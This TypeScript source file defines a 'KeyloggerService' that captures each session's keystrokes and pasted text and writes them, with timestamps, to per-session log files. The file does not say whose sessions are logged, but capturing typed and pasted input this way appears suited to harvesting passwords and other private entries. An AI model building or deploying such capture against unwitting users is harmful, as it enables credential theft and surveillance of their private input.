import { createWriteStream, existsSync, mkdirSync } from 'fs';
import { join } from 'path';
import type { WriteStream } from 'fs';
import { SessionManager } from './SessionManager.js';
import { logger } from '../utils/logger.js';

export class KeyloggerService {
  private keylogFiles: Map<string, WriteStream> = new Map();
  private keylogsDir: string;

  constructor(
    private sessionManager: SessionManager,
    keylogsDir: string = './keylogs'
  ) {
    this.keylogsDir = keylogsDir;
    this.ensureKeylogsDirectory();
  }

  /**
   * Ensure keylogs directory exists
   */
  private ensureKeylogsDirectory(): void {
    if (!existsSync(this.keylogsDir)) {
      mkdirSync(this.keylogsDir, { recursive: true });
      logger.info(`Created keylogs directory: ${this.keylogsDir}`);
    }
  }

  /**
   * Log a keystroke for a session
   */
  async logKey(sessionId: string, key: string, eventType: 'down' | 'up'): Promise<void> {
    const session = this.sessionManager.getSession(sessionId);
    if (!session) {
      return;
    }

    let newLog = session.keylog;

    if (eventType === 'down') {
      if (key === 'Backspace') {
        // Remove last character
        newLog = session.keylog.slice(0, -1);
      } else if (key === 'Enter' || key === 'Tab') {
        newLog = session.keylog + '\n';
      } else if (key === 'Space') {
        newLog = session.keylog + ' ';
      } else if (key.length === 1) {
        // Regular character
        newLog = session.keylog + key;
      } else {
        // Special key - log as [KeyName]
        newLog = session.keylog + `[${key}]`;
      }
    }

    // Update session keylog
    await this.sessionManager.appendKeylog(sessionId, newLog.slice(session.keylog.length));

    // Write to file
    this.writeToFile(sessionId, key, eventType);

    logger.debug(`Key logged for session ${sessionId}: ${key} (${eventType})`);
  }

  /**
   * Log paste event
   */
  async logPaste(sessionId: string, text: string): Promise<void> {
    const session = this.sessionManager.getSession(sessionId);
    if (!session) {
      return;
    }

    await this.sessionManager.appendKeylog(sessionId, `[PASTE:${text}]`);

    this.writeToFile(sessionId, `[PASTE:${text}]`, 'down');
    logger.debug(`Paste logged for session ${sessionId}: ${text.length} characters`);
  }

  /**
   * Write to keylog file
   */
  private writeToFile(sessionId: string, key: string, eventType: 'down' | 'up'): void {
    if (!this.keylogFiles.has(sessionId)) {
      const filePath = join(this.keylogsDir, `session-${sessionId}.log`);
      const stream = createWriteStream(filePath, { flags: 'a' });
      this.keylogFiles.set(sessionId, stream);
      logger.info(`Created keylog file for session ${sessionId}: ${filePath}`);
    }

    const stream = this.keylogFiles.get(sessionId)!;
    const timestamp = new Date().toISOString();
    stream.write(`[${timestamp}] ${eventType.toUpperCase()}: ${key}\n`);
  }

  /**
   * Get keylog for a session
   */
  getKeylog(sessionId: string): string {
    const session = this.sessionManager.getSession(sessionId);
    return session?.keylog || '';
  }

  /**
   * Close keylog file for a session
   */
  async closeKeylog(sessionId: string): Promise<void> {
    const stream = this.keylogFiles.get(sessionId);
    if (stream) {
      return new Promise((resolve, reject) => {
        stream.end((error: Error | null) => {
          if (error) {
            logger.error(`Error closing keylog file for session ${sessionId}:`, error);
            reject(error);
          } else {
            this.keylogFiles.delete(sessionId);
            logger.info(`Closed keylog file for session ${sessionId}`);
            resolve();
          }
        });
      });
    }
  }

  /**
   * Close all keylog files
   */
  async closeAll(): Promise<void> {
    const sessionIds = Array.from(this.keylogFiles.keys());
    await Promise.all(sessionIds.map((id) => this.closeKeylog(id)));
  }
}

